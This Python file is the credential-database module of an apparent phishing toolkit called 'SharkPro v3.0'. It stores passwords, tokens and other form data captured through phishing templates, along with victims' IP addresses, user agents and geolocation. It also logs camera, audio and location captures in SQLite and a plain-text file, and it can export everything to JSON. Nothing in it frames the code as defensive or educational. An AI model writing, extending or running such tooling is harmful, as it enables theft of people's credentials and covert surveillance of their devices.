#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SharkPro v3.0 - Credential Database
Handles storage and retrieval of captured credentials
"""

import os
import sys
import json
import sqlite3
import hashlib
from datetime import datetime

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from config import *

class CredentialDB:
    """SQLite database for credentials"""
    
    def __init__(self, db_path="sharkpro.db"):
        self.db_path = db_path
        self.init_db()
    
    def init_db(self):
        """Initialize database tables"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS credentials (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT NOT NULL,
                ip TEXT,
                user_agent TEXT,
                template_name TEXT,
                template_type TEXT,
                data TEXT,  -- JSON
                geo_data TEXT,  -- JSON
                session_id TEXT
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS captures (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT NOT NULL,
                ip TEXT,
                type TEXT,  -- camera, audio, location
                file_path TEXT,
                metadata TEXT  -- JSON
            )
        ''')
        
        conn.commit()
        conn.close()
    
    def save_credentials(self, ip, user_agent, template, form_data, geo_data=None):
        """Save captured credentials"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        session_id = hashlib.md5(f"{ip}{datetime.now()}".encode()).hexdigest()[:16]
        
        cursor.execute('''
            INSERT INTO credentials 
            (timestamp, ip, user_agent, template_name, template_type, data, geo_data, session_id)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            datetime.now().isoformat(),
            ip,
            user_agent[:255],
            template.get('name', 'Unknown'),
            template.get('type', 'unknown'),
            json.dumps(form_data),
            json.dumps(geo_data) if geo_data else None,
            session_id
        ))
        
        conn.commit()
        conn.close()
        
        # Also save to text file
        self._save_to_file(ip, template, form_data, geo_data)
        
        return session_id
    
    def _save_to_file(self, ip, template, data, geo_data):
        """Save to human-readable text file"""
        with open(CREDS_FILE, "a") as f:
            f.write(f"\n{'='*60}\n")
            f.write(f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"IP: {ip}\n")
            f.write(f"Template: {template.get('name', 'Unknown')}\n")
            f.write(f"Type: {template.get('type', 'unknown')}\n")
            if geo_data:
                f.write(f"Location: {geo_data.get('city', 'Unknown')}, {geo_data.get('country', 'Unknown')}\n")
                f.write(f"Coords: {geo_data.get('loc', 'Unknown')}\n")
                f.write(f"ISP: {geo_data.get('isp', 'Unknown')}\n")
            f.write(f"Data:\n")
            for key, value in data.items():
                if any(k in key.lower() for k in ['pass', 'pwd', 'token', 'key']):
                    f.write(f"  {key}: {value}\n")
                else:
                    f.write(f"  {key}: {value}\n")
            f.write(f"{'='*60}\n")
    
    def save_capture(self, ip, capture_type, file_path, metadata=None):
        """Save camera/audio capture record"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT INTO captures (timestamp, ip, type, file_path, metadata)
            VALUES (?, ?, ?, ?, ?)
        ''', (
            datetime.now().isoformat(),
            ip,
            capture_type,
            file_path,
            json.dumps(metadata) if metadata else None
        ))
        
        conn.commit()
        conn.close()
    
    def get_stats(self):
        """Get capture statistics"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        stats = {
            'total_creds': cursor.execute('SELECT COUNT(*) FROM credentials').fetchone()[0],
            'total_captures': cursor.execute('SELECT COUNT(*) FROM captures').fetchone()[0],
            'templates_used': cursor.execute('''
                SELECT template_name, COUNT(*) 
                FROM credentials 
                GROUP BY template_name 
                ORDER BY COUNT(*) DESC
            ''').fetchall()
        }
        
        conn.close()
        return stats
    
    def export_json(self, output_file="export.json"):
        """Export all data to JSON"""
        conn = sqlite3.connect(self.db_path)
        
        # Export credentials
        creds = conn.execute('SELECT * FROM credentials').fetchall()
        captures = conn.execute('SELECT * FROM captures').fetchall()
        
        data = {
            'credentials': creds,
            'captures': captures,
            'exported': datetime.now().isoformat()
        }
        
        with open(output_file, 'w') as f:
            json.dump(data, f, indent=2, default=str)
        
        conn.close()
        return output_file


if __name__ == "__main__":
    db = CredentialDB()
    print(f"{G}[✓] Database initialized{NC}")
    stats = db.get_stats()
    print(f"Total captures: {stats['total_creds']}")